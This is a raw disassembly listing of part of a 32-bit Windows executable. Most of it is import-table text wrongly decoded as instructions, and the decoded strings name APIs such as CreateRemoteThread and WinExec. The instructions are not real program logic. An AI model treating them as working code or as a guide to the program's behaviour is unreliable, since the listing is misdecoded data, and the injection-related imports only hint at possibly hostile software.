  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
